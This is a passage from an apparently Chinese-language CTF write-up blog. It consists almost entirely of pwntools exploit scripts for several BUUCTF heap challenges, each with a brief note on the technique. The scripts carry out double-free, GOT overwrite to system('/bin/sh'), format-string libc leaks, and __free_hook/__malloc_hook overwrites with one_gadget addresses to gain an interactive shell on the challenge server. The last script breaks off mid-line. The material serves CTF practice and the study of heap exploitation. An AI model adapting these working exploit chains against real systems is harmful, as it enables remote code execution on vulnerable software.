0x6020A0</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">16</span>~<span class="number">96</span></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>, str(size).encode())</span><br><span class="line">    sla(b<span class="string">&quot;Name:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;delete:&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="meta"># def show(index: int):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;input note id: &quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index: int, content: bytes):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;age of user: &quot;</span>, str(index).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;username: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">18</span>):</span><br><span class="line">    add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x58</span>, b<span class="string">&quot;a&quot;</span>)  # <span class="number">18</span></span><br><span class="line">add(<span class="number">0x58</span>, b<span class="string">&quot;a&quot;</span>)  # <span class="number">19</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">17</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">16</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">18</span>):</span><br><span class="line">    add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, b<span class="string">&quot;a&quot;</span>)  # <span class="number">18</span></span><br><span class="line">add(<span class="number">0x60</span>, b<span class="string">&quot;a&quot;</span>)  # <span class="number">19</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">17</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">16</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>, p64(elf.got[<span class="string">&quot;free&quot;</span>] - <span class="number">0x1E</span>))</span><br><span class="line">add(<span class="number">0x58</span>, b<span class="string">&quot;%13$p&quot;</span>)</span><br><span class="line">add(<span class="number">0x58</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0x71</span>) + b<span class="string">&quot;\0&quot;</span> * (<span class="number">6</span>) + p32(elf.plt[<span class="string">&quot;printf&quot;</span>]) + b<span class="string">&quot;\0&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>] - <span class="number">240</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add(<span class="number">0x60</span>, p64(elf.got[<span class="string">&quot;free&quot;</span>] - <span class="number">0x16</span>))</span><br><span class="line">add(<span class="number">0x60</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(</span><br><span class="line">    <span class="number">0x60</span>,</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">6</span></span><br><span class="line">    + p32(system_addr &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    + p16((system_addr &amp; <span class="number">0xFFFF00000000</span>) &gt;&gt; <span class="number">32</span>),</span><br><span class="line">)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="rootersctf-2019-heaaaappppp"><a href="#rootersctf-2019-heaaaappppp" class="headerlink" title="rootersctf_2019_heaaaappppp"></a>rootersctf_2019_heaaaappppp</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rootersctf_2019_heaaaappppp">BUUCTF在线评测</a></p>
<p>不是什么难题，就是要借助栈来泄露libc,但不是很稳定</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./rootersctf_2019_heaaaappppp&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25536</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *$rebase(0x13B5)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/4xg $rebase(0x4088)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">0x20</span> <span class="number">0x30</span> <span class="number">0x40</span></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;age of user: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Enter username: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>():</span><br><span class="line">    sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># def show(index: int):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;5.Exit\n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;input note id: &quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;age of user: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;username: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def sendMessage(content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter message to be sent: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">sendMessage(b<span class="string">&quot;a&quot;</span> * <span class="number">7</span> + b<span class="string">&quot;b&quot;</span> + b<span class="string">&quot;c&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FA84C0DE563</span> + <span class="number">0x7FA84BAC7000</span></span><br><span class="line">add(<span class="number">0x10</span>, b<span class="string">&quot;b&quot;</span> * <span class="number">7</span>)</span><br><span class="line"><span class="built_in">free</span>()</span><br><span class="line"><span class="built_in">free</span>()</span><br><span class="line">edit(<span class="number">123</span>, p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">0x10</span>, p64(libc_base + one_gadget[<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">free</span>()</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ycb-2020-easypwn"><a href="#ycb-2020-easypwn" class="headerlink" title="ycb_2020_easypwn"></a>ycb_2020_easypwn</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ycb_2020_easypwn">BUUCTF在线评测</a></p>
<p>挺简单的一道题目，没什么好说的，利用unsorted bin泄露libc,然后double free到malloc_hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ycb_2020_easypwn&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28833</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *$rebase(0xB76)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x2020C0)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes, content2: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice : &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;size of the game&#x27;s name: \n&quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;game&#x27;s name:\n&quot;</span>, content)</span><br><span class="line">    sla(b<span class="string">&quot;game&#x27;s message:\n&quot;</span>, content2)</span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index: int, content: bytes):</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Size: &quot;</span>, str(len(content)).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Data: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line"># 清空了</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice : &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;index:\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sa(b<span class="string">&quot;choice : &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>, b<span class="string">&quot;0&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, b<span class="string">&quot;1&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;2&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;ame[3]&#x27;s name :&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7F510DF9FB61</span> + <span class="number">0x7F510DBDB000</span></span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span>)</span><br><span class="line"># <span class="number">1</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, p64(libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x23</span>), b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x13</span> + p64(one_gadget[<span class="number">3</span>] + libc_base), b<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;choice : &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting">BUUCTF在线评测</a></p>
<p>比较简单的double free需要利用格式化字符串泄露栈地址strncmp只会比较对应长度</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./gyctf_2020_some_thing_interesting&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">26665</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xF63)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/4xg $rebase(0x2020E0)</span></span><br><span class="line"><span class="string">    x/4xg $rebase(0x202140)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    x/4xg $rebase(0x2021A0)</span></span><br><span class="line"><span class="string">    x/4xg $rebase(0x202080)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;=<span class="number">0x70</span> 舞动</span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes, sizet: <span class="type">int</span>, contentt: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;want to do :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;&gt; O&#x27;s length : &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;&gt; O : &quot;</span>, content)</span><br><span class="line">    sla(b<span class="string">&quot;&gt; RE&#x27;s length : &quot;</span>, str(sizet).encode())</span><br><span class="line">    sa(b<span class="string">&quot;&gt; RE : &quot;</span>, contentt)</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes, contentt: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;want to do :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;&gt; O : &quot;</span>, content)</span><br><span class="line">    sa(b<span class="string">&quot;&gt; RE : &quot;</span>, contentt)</span><br><span class="line"></span><br><span class="line"># 没有清空，只删除</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;want to do :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;&gt; Oreo ID : &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;want to do :&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;&gt; Oreo ID : &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">    sla(b<span class="string">&quot;want to do :&quot;</span>, b<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;code please:&quot;</span>, b<span class="string">&quot;OreOOrereOOreO%17$p&quot;</span>)</span><br><span class="line">check()</span><br><span class="line">ru(b<span class="string">&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x7F6CA166A830</span> + <span class="number">0x7F6CA164A000</span></span><br><span class="line">malloc_hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">add(<span 